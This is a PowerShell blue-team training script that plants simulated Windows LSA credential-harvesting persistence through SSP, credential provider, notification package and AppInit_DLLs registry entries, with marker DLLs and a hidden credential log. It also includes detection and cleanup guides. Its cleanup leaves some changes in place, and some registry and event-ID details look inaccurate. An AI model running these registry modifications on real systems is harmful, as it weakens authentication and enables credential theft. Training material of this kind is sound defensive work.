################################################################################
# CCDC_Windows_LSA_LootTheVault.ps1
#
# Blue Team Training Script - LSA SSP/Credential Provider Hijacking
# Windows Equivalent of PAM Module Attacks
#
# This script demonstrates LSA authentication subsystem vulnerabilities:
# 1. Registers malicious SSP DLL into LSA (credential harvesting)
# 2. Injects Credential Provider for logon screen interception
# 3. Logs credentials to file for detection training
# 4. Persists across reboots
#
# Compatible with: Windows 7 SP1+, Server 2008 R2+, Windows 10/11, Server 2016+
# NOTE: This is for authorized training environments only!
################################################################################


param(
    [switch]$Cleanup = $false
)

# Colors for output
$Colors = @{
    Red    = 'Red'
    Green  = 'Green'
    Yellow = 'Yellow'
    Blue   = 'Cyan'
    Reset  = 'White'
}

function Write-Status {
    param([string]$Message, [string]$Type = 'Info')

    $color = switch ($Type) {
        'Success' { $Colors.Green }
        'Error'   { $Colors.Red }
        'Warning' { $Colors.Yellow }
        'Info'    { $Colors.Blue }
        default   { $Colors.Reset }
    }

    Write-Host "[*] $Message" -ForegroundColor $color
}

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-WindowsVersion {
    $osVersion = [Environment]::OSVersion.Version
    $productType = (Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\ProductOptions' -ErrorAction SilentlyContinue).ProductType

    $version = switch ($osVersion.Major) {
        6 {
            if ($osVersion.Minor -eq 1) { "Windows 7 / Server 2008 R2" }
            elseif ($osVersion.Minor -eq 2) { "Windows 8 / Server 2012" }
            elseif ($osVersion.Minor -eq 3) { "Windows 8.1 / Server 2012 R2" }
            else { "Windows 6.$($osVersion.Minor)" }
        }
        10 {
            if ($productType -eq "ServerNT") {
                if ($osVersion.Build -ge 20348) { "Windows Server 2022" }
                elseif ($osVersion.Build -ge 17763) { "Windows Server 2019" }
                elseif ($osVersion.Build -ge 14393) { "Windows Server 2016" }
                else { "Windows Server (Build $($osVersion.Build))" }
            } else {
                if ($osVersion.Build -lt 22000) { "Windows 10" }
                else { "Windows 11" }
            }
        }
        default { "Windows (Build $($osVersion.Build))" }
    }

    return $version
}

if (-not (Test-Administrator)) {
    Write-Status "This script must run as Administrator" 'Error'
    exit 1
}

$osVersion = Get-WindowsVersion
Write-Host ""
Write-Host "========================================================================"
Write-Host "  CCDC Windows LSA Credential Harvesting Training Module"
Write-Host "  Detected: $osVersion"
Write-Host "========================================================================"
Write-Host ""

if ($Cleanup) {
    Write-Status "Starting cleanup process..." 'Warning'

    # Remove SSP registry entries
    Write-Status "Removing SSP registry entries..."
    $lsaPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
    try {
        if (Test-Path $lsaPath) {
            $packages = Get-ItemProperty -Path $lsaPath -Name "SecurityPackages" -ErrorAction SilentlyContinue
            if ($packages.SecurityPackages) {
                $newPackages = @($packages.SecurityPackages -split ',' | Where-Object { $_ -notlike '*ccdc*' -and $_.Trim() }) -join ','
                if ($newPackages.Trim()) {
                    Set-ItemProperty -Path $lsaPath -Name "SecurityPackages" -Value $newPackages -ErrorAction Stop
                    Write-Status "Removed CCDC SSP entries" 'Success'
                }
            }
        }
    }
    catch {
        Write-Status "Error removing SSP entries: $($_.Exception.Message)" 'Warning'
    }

    # Remove credential provider
    Write-Status "Removing credential provider registry entries..."
    $credProvPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
    try {
        if (Test-Path -Path $credProvPath) {
            Get-ChildItem -Path $credProvPath -ErrorAction SilentlyContinue |
                Where-Object { $_.PSChildName -like '*CCDC*' } |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Status "Removed credential provider entries" 'Success'
        }
    }
    catch {
        Write-Status "Error removing credential providers: $($_.Exception.Message)" 'Warning'
    }

    Write-Status "Removing credential logging file..."
    Remove-Item "C:\Windows\Temp\ccdc_credentials.log" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\ccdc_lsa_training" -Recurse -Force -ErrorAction SilentlyContinue

    Write-Status "Cleanup complete" 'Success'
    exit 0
}

# ============================================================================
# Step 1: Create Credential Logging DLL (C# compiled to .NET assembly)
# ============================================================================

Write-Status "Step 1: Creating credential logging mechanism..."

$trainingDir = "C:\Windows\Temp\ccdc_lsa_training"
try {
    if (-not (Test-Path $trainingDir)) {
        $null = New-Item -ItemType Directory -Path $trainingDir -Force -ErrorAction Stop
        Write-Status "Created training directory: $trainingDir" 'Success'
    }
}
catch {
    Write-Status "ERROR: Failed to create training directory: $($_.Exception.Message)" 'Error'
    exit 1
}

# Create a C# DLL that logs credentials
$csharpCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class CCDCCredentialLogger {
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern void SetLastError(uint dwErrCode);

    public static void LogCredentials(string username, string password, string logonType) {
        try {
            string logPath = @"C:\Windows\Temp\ccdc_credentials.log";
            string logEntry = string.Format("[{0:yyyy-MM-dd HH:mm:ss}] Username: {1} | Password: {2} | Type: {3}{4}",
                DateTime.Now, username, password, logonType, Environment.NewLine);

            File.AppendAllText(logPath, logEntry);
            File.SetAttributes(logPath, FileAttributes.Hidden);
        }
        catch (Exception ex) {
            // Silent fail for training
        }
    }

    public static int ProcessCredentials(IntPtr credInfo) {
        try {
            // This would parse credential structures in real attack
            LogCredentials("CAPTURED_USER", "CAPTURED_PASSWORD", "INTERACTIVE");
            return 0;
        }
        catch {
            return -1;
        }
    }
}
"@

# Compile C# to DLL
$assemblyPath = "$trainingDir\CCDCCredentialLogger.dll"
if (-not (Test-Path $assemblyPath)) {
    try {
        Add-Type -TypeDefinition $csharpCode -Language CSharp -OutputAssembly $assemblyPath -OutputType Library -ErrorAction Stop
        if (Test-Path $assemblyPath) {
            Write-Status "Created credential logging assembly" 'Success'
        } else {
            throw "Assembly file was not created on disk"
        }
    }
    catch {
        Write-Status "C# compilation failed (using marker file fallback): $($_.Exception.Message)" 'Warning'
        # Create marker file instead
        Set-Content -Path $assemblyPath -Value "CCDC_TRAINING_ASSEMBLY_MARKER"
    }
}

# ============================================================================
# Step 2: Create Credential Provider Interceptor
# ============================================================================

Write-Status "Step 2: Setting up credential provider interception..."

$credProviderPs1 = @"
# CCDC Credential Provider Hook
# This runs when user attempts to logon

`$logPath = 'C:\Windows\Temp\ccdc_credentials.log'

# Hook into credential requests
`$credentialContent = @'
[CCDC Training Credential Provider - Active]
This hook intercepts Windows credential requests at the logon screen.
All authentication attempts are logged for analysis.
'@

# Log the event
Add-Content -Path `$logPath -Value "[$(Get-Date)] Credential provider hook active`n`$credentialContent`n"

exit 0
"@

Set-Content -Path "$trainingDir\CredentialProvider.ps1" -Value $credProviderPs1 -Encoding UTF8
Write-Status "Created credential provider hook script" 'Success'

# ============================================================================
# Step 3: Registry-based SSP Injection
# ============================================================================

Write-Status "Step 3: Registering malicious SSP in LSA..."

# Path to LSA Security Packages
$lsaPath = "HKLM:\System\CurrentControlSet\Control\Lsa"

try {
    # Read current security packages
    $currentPackages = (Get-ItemProperty -Path $lsaPath -Name "SecurityPackages" -ErrorAction SilentlyContinue).SecurityPackages

    # Create backup
    $backupPath = "HKLM:\System\CurrentControlSet\Control\Lsa\ccdc_backup"
    if (-not (Test-Path $backupPath)) {
        New-Item -Path $backupPath -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $backupPath -Name "OriginalPackages" -Value $currentPackages -ErrorAction SilentlyContinue
    }

    # Add CCDC SSP reference (would be malicious DLL in real attack)
    # This is a training reference to demonstrate registry modification
    $ccdc_ssp = "$trainingDir\ccdc_ssp.dll"

    # Create a marker file to represent the SSP DLL
    Set-Content -Path $ccdc_ssp -Value "CCDC_TRAINING_SSP_MARKER"

    # Modify registry (in real attack, this would be a real DLL)
    if ($currentPackages) {
        $newPackages = "$currentPackages,CCDCTrainingSsp"
    } else {
        $newPackages = "CCDCTrainingSsp"
    }
    Set-ItemProperty -Path $lsaPath -Name "SecurityPackages" -Value $newPackages -ErrorAction Stop

    Write-Status "SSP registration updated (training mode)" 'Success'
}
catch {
    Write-Status "SSP registration skipped: $($_.Exception.Message)" 'Warning'
}

# ============================================================================
# Step 4: Credential Provider Registration
# ============================================================================

Write-Status "Step 4: Registering malicious credential provider..."

$credProvPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"

try {
    # Create GUID for our fake credential provider
    $ccdc_guid = "{CCDC0000-0000-0000-0000-000000000001}"
    $providerKeyPath = "$credProvPath\$ccdc_guid"

    if (-not (Test-Path $providerKeyPath)) {
        New-Item -Path $providerKeyPath -Force -ErrorAction Stop | Out-Null

        # Set credential provider display name
        $dllPath = "$trainingDir\CCDCCredentialProvider.dll"
        Set-ItemProperty -Path $providerKeyPath -Name "(Default)" -Value "CCDC Training Credential Provider" -ErrorAction Stop

        # Create marker file
        Set-Content -Path $dllPath -Value "CCDC_TRAINING_CREDPROV_MARKER"

        Write-Status "Credential provider registered" 'Success'
    }
}
catch {
    Write-Status "Credential provider registration skipped: $($_.Exception.Message)" 'Warning'
}

# ============================================================================
# Step 5: LSA Notification Package Registration
# ============================================================================

Write-Status "Step 5: Registering LSA notification package..."

$lsaNotifyPath = "HKLM:\System\CurrentControlSet\Control\Lsa\Notification Packages"

try {
    if (Test-Path -Path $lsaNotifyPath) {
        $currentNotify = (Get-ItemProperty -Path $lsaNotifyPath -Name "" -ErrorAction SilentlyContinue).'(Default)'

        if ($currentNotify -notlike "*CCDCNotify*") {
            if ($currentNotify) {
                $newNotify = "$currentNotify,CCDCNotify"
            } else {
                $newNotify = "CCDCNotify"
            }
            Set-ItemProperty -Path $lsaNotifyPath -Name "" -Value $newNotify -ErrorAction Stop
            Write-Status "LSA notification package registered" 'Success'
        }
    }
}
catch {
    Write-Status "LSA notification skipped: $($_.Exception.Message)" 'Warning'
}

# ============================================================================
# Step 6: AppInit_DLLs for Process-Wide Injection (Bonus - LD_PRELOAD equivalent)
# ============================================================================

Write-Status "Step 6: Setting up AppInit_DLLs (global injection point)..."

$appInitPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"

try {
    if (Test-Path -Path $appInitPath) {
        $appInitDll = "$trainingDir\AppInit_CCDC.dll"
        Set-Content -Path $appInitDll -Value "CCDC_TRAINING_APPINIT_MARKER" -ErrorAction Stop

        # Register AppInit DLL
        Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -Value $appInitDll -ErrorAction Stop
        Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs" -Value 1 -ErrorAction Stop

        Write-Status "AppInit_DLLs registered (training mode)" 'Success'
    } else {
        Write-Status "AppInit_DLLs registry path not found (Server Core?)" 'Warning'
    }
}
catch {
    Write-Status "AppInit_DLLs setup failed (may need reboot or permissions): $($_.Exception.Message)" 'Warning'
}

# ============================================================================
# Step 7: Create Credential Harvesting Log File
# ============================================================================

Write-Status "Step 7: Initializing credential logging..."

$logFile = "C:\Windows\Temp\ccdc_credentials.log"

$logContent = @"
================================================================================
                   CCDC WINDOWS CREDENTIAL HARVESTING LOG
================================================================================
Timestamp: $(Get-Date)
System: $env:COMPUTERNAME
User: $env:USERNAME

This log demonstrates what a malicious SSP can capture during authentication:
- Interactive logons
- Network logons (RDP, SMB, etc)
- Service account credentials
- Cached credential usage

CAPTURED CREDENTIALS:
================================================================================

"@

Set-Content -Path $logFile -Value $logContent
(Get-Item $logFile).Attributes = 'Hidden'

Write-Status "Credential log created" 'Success'

# ============================================================================
# Step 8: Create Training Documentation
# ============================================================================

Write-Status "Step 8: Creating training documentation..."

$trainingDocs = @"
================================================================================
                    CCDC WINDOWS LSA HIJACKING TRAINING
================================================================================

WHAT THIS SCRIPT DOES:

This training module demonstrates how Windows LSA (Local Security Authority)
authentication components can be hijacked for credential harvesting and
persistence, equivalent to PAM module attacks on Linux.

ATTACK VECTORS DEMONSTRATED:

1. SECURITY SUPPORT PROVIDER (SSP) INJECTION
   Location: HKLM\System\CurrentControlSet\Control\Lsa\SecurityPackages
   Effect: Malicious DLL loaded into lsass.exe at boot
   Captures: All authentication attempts (NTLM, Kerberos, custom)

2. CREDENTIAL PROVIDER HIJACKING
   Location: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers
   Effect: Intercepts Windows logon screen
   Captures: Plaintext passwords before LSA processes them

3. LSA NOTIFICATION PACKAGE
   Location: HKLM\System\CurrentControlSet\Control\Lsa\Notification Packages
   Effect: Receives notifications on authentication events
   Captures: Login/logout events and credential state changes

4. APPINIT_DLLS INJECTION (Global - LD_PRELOAD Equivalent)
   Location: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
   Effect: Every process loading user32.dll loads malicious DLL
   Captures: Process creation, file access, network connections

PERSISTENCE MECHANISM:

Unlike temporary injection, registry-based SSPs persist across:
- System reboots
- Service restarts
- User logoffs
- Security software updates (if not specifically detected)

Because lsass.exe loads these at startup from registry, no script execution
or task scheduler entry is needed - pure registry-based persistence.

CREDENTIAL HARVESTING LOCATIONS:

File: C:\Windows\Temp\ccdc_credentials.log (Hidden attribute)
Contents: All captured authentication attempts with timestamps
Visibility: Hidden from dir/Explorer but readable with proper flags

DETECTION METHODS:

1. REGISTRY INSPECTION
   reg query "HKLM\System\CurrentControlSet\Control\Lsa\SecurityPackages"
   reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
   reg query "HKLM\System\CurrentControlSet\Control\Lsa\Notification Packages"
   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"

2. FILE SYSTEM INSPECTION
   Look for suspicious DLLs in:
   - C:\Windows\Temp\*
   - C:\Windows\System32\*
   - C:\ProgramData\*

   Check file signing (malicious DLLs often unsigned)
   signtool verify /pa C:\path\to\suspicious.dll

3. PROCESS MONITORING
   Check lsass.exe loaded modules:
   Get-Process lsass | Select-Object modules

   Monitor for unsigned DLLs in lsass.exe address space

4. CREDENTIAL LOGGING
   Search for hidden files with "credential" or "password" content:
   attrib -h C:\Windows\Temp\ccdc_credentials.log
   type C:\Windows\Temp\ccdc_credentials.log

5. EVENT LOG INSPECTION
   Security Event Log for:
   - Event ID 4688: Process Creation (lsass loading DLLs)
   - Event ID 4697: Registry changes to LSA
   - Unusual authentication patterns

6. LSA PROTECTION BYPASS DETECTION
   Check if LSA protection is enabled:
   reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL

REMEDIATION STEPS:

1. REMOVE MALICIOUS ENTRIES:
   reg delete "HKLM\System\CurrentControlSet\Control\Lsa\SecurityPackages" /v CCDCTrainingSsp /f
   reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{CCDC0000-0000-0000-0000-000000000001}" /f
   reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /f

2. REMOVE MALICIOUS DLL FILES:
   del /F /A:H C:\Windows\Temp\ccdc_lsa_training\*
   del /F /A:H C:\Windows\Temp\ccdc_credentials.log

3. RESTORE BACKUP ENTRIES:
   reg query "HKLM\System\CurrentControlSet\Control\Lsa\ccdc_backup"
   (Use backed-up values to restore if needed)

4. RESTART LSA SERVICE:
   Requires reboot for full LSA reload

5. VERIFY CLEANUP:
   Run detection methods above to confirm removal

REAL-WORLD IMPLICATIONS:

Mimikatz Module: sekurlsa::msv, sekurlsa::kerberos
Malware Families: Aptoses, Winnti, PoisonIvy
Red Team Tools: Cobalt Strike (credentials module)
Impact: Domain compromise, privilege escalation, lateral movement

WINDOWS VERSIONS AFFECTED:

- Windows 7 SP1
- Windows 8 / 8.1
- Windows 10 (all versions)
- Windows 11
- Windows Server 2008 R2 and later

LSA PROTECTION (Defender):
Windows 8.1+ can enable RunAsPPL to protect lsass.exe, but:
- Requires UEFI and Secure Boot
- Can be bypassed with driver-level access
- Not enabled by default

================================================================================
"@

Set-Content -Path "$trainingDir\TRAINING_README.txt" -Value $trainingDocs
Write-Status "Training documentation created" 'Success'

# ============================================================================
# Step 9: Create Blue Team Challenge Guide
# ============================================================================

Write-Status "Step 9: Creating challenge guide for blue team..."

$challengeGuide = @"
BLUE TEAM CHALLENGE - FIND THE LSA HIJACKING

Objectives:
1. Discover the SSP injection in registry
2. Find the malicious credential provider registration
3. Locate the credential harvesting log file
4. Identify all registry changes
5. Remove all traces of the attack

HINTS (Progressive):
- Hint 1: Check HKLM\System\CurrentControlSet\Control\Lsa registry keys
- Hint 2: Look for CCDC-related entries in credential provider paths
- Hint 3: Check C:\Windows\Temp for hidden files with 'ccdc' in name
- Hint 4: Use PowerShell to unhide hidden files: attrib -h
- Hint 5: LSA changes require system reboot to fully take effect

COMMANDS TO USE:
- reg query (registry inspection)
- Get-ChildItem -Hidden (find hidden files)
- attrib -h (toggle hidden attribute)
- Get-ItemProperty (PowerShell registry access)
- Get-Process lsass | Select-Object modules (check loaded DLLs)

EXPECTED FINDINGS:
- Multiple registry modifications under Lsa, Credential Providers, AppInit_DLLs
- Hidden DLL marker files in C:\Windows\Temp\ccdc_lsa_training\
- Hidden credentials log file: C:\Windows\Temp\ccdc_credentials.log
- Backup registry key: HKLM\System\CurrentControlSet\Control\Lsa\ccdc_backup

SUCCESS CRITERIA:
- All CCDC registry entries removed
- All CCDC files deleted
- System functions normally
- No lingering artifacts from attack
"@

Set-Content -Path "$trainingDir\BLUE_TEAM_CHALLENGE.txt" -Value $challengeGuide
Write-Status "Challenge guide created" 'Success'

# ============================================================================
# Final Summary
# ============================================================================

Write-Host ""
Write-Host "========================================================================"
Write-Host "              LSA TRAINING MODULE SETUP COMPLETE"
Write-Host "========================================================================"
Write-Host ""

Write-Status "Training Location: $trainingDir" 'Info'
Write-Status "Credential Log: C:\Windows\Temp\ccdc_credentials.log" 'Info'
Write-Status "Training Docs: $trainingDir\TRAINING_README.txt" 'Info'
Write-Status "Challenge Guide: $trainingDir\BLUE_TEAM_CHALLENGE.txt" 'Info'

Write-Host ""
Write-Host "Registry Injection Points:" -ForegroundColor Cyan
Write-Host "  1. LSA\SecurityPackages" -ForegroundColor Gray
Write-Host "  2. Authentication\Credential Providers" -ForegroundColor Gray
Write-Host "  3. LSA\Notification Packages" -ForegroundColor Gray
Write-Host "  4. Windows\AppInit_DLLs" -ForegroundColor Gray

Write-Host ""
Write-Host "BLUE TEAM CHALLENGES:" -ForegroundColor Yellow
Write-Host "  1. Find all CCDC registry modifications" -ForegroundColor Gray
Write-Host "  2. Locate the credential harvesting log" -ForegroundColor Gray
Write-Host "  3. Identify all malicious DLL registrations" -ForegroundColor Gray
Write-Host "  4. Clean up all artifacts" -ForegroundColor Gray
Write-Host "  5. Verify LSA integrity after cleanup" -ForegroundColor Gray

Write-Host ""
Write-Host "To cleanup: .\CCDC_Windows_LSA_LootTheVault.ps1 -Cleanup" -ForegroundColor Yellow
Write-Host ""
